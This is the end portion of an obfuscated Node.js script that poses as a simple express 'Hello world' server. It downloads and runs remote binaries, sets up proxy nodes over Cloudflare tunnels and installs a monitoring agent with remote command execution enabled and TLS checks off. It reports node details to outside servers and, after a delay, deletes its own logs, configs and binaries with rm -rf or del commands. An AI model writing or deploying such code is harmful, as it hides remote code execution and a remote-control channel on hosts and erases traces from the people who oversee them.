_0x5e628&&_0x5e628[_0x262e57(_0x4d1ad4._0x1eb86b)]===0xc8?(console[_0x262e57(_0x4d1ad4._0x355aa8)](_0x262e57(_0x4d1ad4._0x4d8f52)),_0x5e628):null;}catch(_0x1c9759){return null;}}else return;}}function cleanFiles(){const _0x5bd720={_0x3d95e0:0x292,_0x4c2047:0x286,_0x567171:0x265,_0x365837:0x26b,_0x56655a:0x268},_0x35bb5d={_0x435aa5:0x27f,_0x3592ce:0x1fd};setTimeout(()=>{const _0x2d1b83=_0x3c2c,_0x4b6490=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4b6490[_0x2d1b83(_0x5bd720._0x3d95e0)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4b6490[_0x2d1b83(0x292)](phpPath);process[_0x2d1b83(_0x5bd720._0x4c2047)]===_0x2d1b83(_0x5bd720._0x567171)?exec(_0x2d1b83(0x24f)+_0x4b6490[_0x2d1b83(0x268)]('\x20')+'\x20>\x20nul\x202>&1',_0xc8839=>{const _0x3731c2=_0x2d1b83;console[_0x3731c2(_0x35bb5d._0x435aa5)](),console[_0x3731c2(0x24a)](_0x3731c2(_0x35bb5d._0x3592ce)),console[_0x3731c2(0x24a)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x2d1b83(_0x5bd720._0x365837)+_0x4b6490[_0x2d1b83(_0x5bd720._0x56655a)]('\x20')+'\x20>/dev/null\x202>&1',_0x4264f8=>{const _0x1471c9=_0x2d1b83;console[_0x1471c9(0x27f)](),console[_0x1471c9(0x24a)](_0x1471c9(0x1fd)),console[_0x1471c9(0x24a)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();function _0x15f4(){const _0x3134fd=['join','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','12yJdLJS','rm\x20-rf\x20','toString','charAt','listen','mkdirSync','8znqpKB','pipe','nohup\x20','abcdefghijklmnopqrstuvwxyz','readFileSync','\x20-c\x20','Unknown','&path=%2Ftrojan-argo%3Fed%3D2560#','/trojan-argo','8443','split','PORT','NEZHA_PORT','https://oooo.serv00.net/add-url','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','clear','2096','env','vmess','false','?encryption=none&security=tls&sni=','block','platform','NEZHA_SERVER','/config.json\x20>/dev/null\x202>&1\x20&','Railway-US-ATSRSD','https://amd64.ssss.nyc.mn/bot','arm','data','arch','direct','\x20-s\x20','substring','Nodes\x20uploaded\x20successfully','push','Empowerment\x20success\x20for\x20','NEZHA_KEY','config.yaml','/tunnel.yml\x20run','AUTO_ACCESS','boot.log','\x22\x20>\x20/dev/null\x202>&1','firefox','NEZHA\x20variable\x20is\x20empty,skip\x20running','FILE_PATH','443','4019540IHYXJP','country_code','2083','4027298tOyjUh','ARGO_PORT','\x20is\x20created','\x0a\x20\x20tunnel:\x20','text/plain;\x20charset=utf-8','readdirSync','statSync','stream','--tls','sub.txt','quic','https://arm64.ssss.nyc.mn/web','/dev/null','Download\x20','util','utf-8','status','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ARGO_AUTH','https://arm64.ssss.nyc.mn/v1','application/json','127.0.0.1','CFPORT','App\x20is\x20running','\x20>/dev/null\x202>&1\x20&','UUID','error','ARGO_DOMAIN:','child_process','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','224446xsKIjX','trojan','writeFileSync','http://ip-api.com/json/','Content-Type','Subscription\x20uploaded\x20successfully','stringify','/api/add-nodes','pop','4xZJMVv','unshift','Error\x20in\x20startserver:','8f31898e-0376-40fd-9a28-a0787fda73b9','2053','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','path','2317567NHkTkY','catch','success','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0a\x20\x20\x20\x20','/vless-argo','http\x20server\x20is\x20running\x20on\x20port:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','base64','from','aarch64','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','match','set','existsSync','taskkill\x20/f\x20/im\x20','length','fileUrl','has','SERVER_PORT','https+local://8.8.8.8/dns-query','php\x20running\x20error:\x20','post','basename','\x0a\x0atrojan://','\x0a\x0avmess://','express','unlinkSync','arm64','random','includes','floor','33atmjxA','&fp=firefox&type=ws&host=','config.json','send','2087','14191879uePBtz','cdns.doon.eu.org','2507655AcxwHR','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','org','\x20failed:\x20','PROJECT_URL','get','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','none','\x20-p\x20','unlink','\x20-c\x20\x22','Error\x20downloading\x20files:','Hello\x20world!','\x20successfully','NAME','log','/vmess-argo?ed=2560','/sub.txt\x20saved\x20successfully','axios','\x0a\x20\x20credentials-file:\x20','del\x20/f\x20/q\x20','forEach','tcp','.exe\x20>\x20nul\x202>&1','filter','vless','/api/add-subscriptions','157904FhcAlm','list.txt','response','test','message','\x20is\x20running','9kVwTZH','close','isFile','tls','/vmess-argo','Add\x20automatic\x20access\x20task\x20faild:\x20','http','6JWqEmZ','sub','win32','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https://amd64.ssss.nyc.mn/v1'];_0x15f4=function(){return _0x3134fd;};return _0x15f4();}async function AddVisitTask(){const _0x2ae9a5={_0x5f1754:0x24a,_0x36120e:0x22a,_0x5526fc:0x261},_0x14a3a5=_0x3e7365;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x14a3a5(_0x2ae9a5._0x5f1754)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x17444f=await axios[_0x14a3a5(_0x2ae9a5._0x36120e)](_0x14a3a5(0x27d),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x14a3a5(_0x2ae9a5._0x5f1754)]('automatic\x20access\x20task\x20added\x20successfully'),_0x17444f;}catch(_0x262825){return console[_0x14a3a5(0x200)](_0x14a3a5(_0x2ae9a5._0x5526fc)+_0x262825[_0x14a3a5(0x25a)]),null;}}async function startserver(){const _0x6b56a6={_0x46abf5:0x200},_0x1cc5bf=_0x3e7365;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1fbba8){console[_0x1cc5bf(_0x6b56a6._0x46abf5)](_0x1cc5bf(0x20f),_0x1fbba8);}}startserver()[_0x3e7365(0x215)](_0x5e2d8e=>{const _0x39919e={_0x1a12d6:0x200},_0x7e3f73=_0x3e7365;console[_0x7e3f73(_0x39919e._0x1a12d6)]('Unhandled\x20error\x20in\x20startserver:',_0x5e2d8e);}),app[_0x3e7365(0x26e)](PORT,()=>console['log'](_0x3e7365(0x21a)+PORT+'!'));
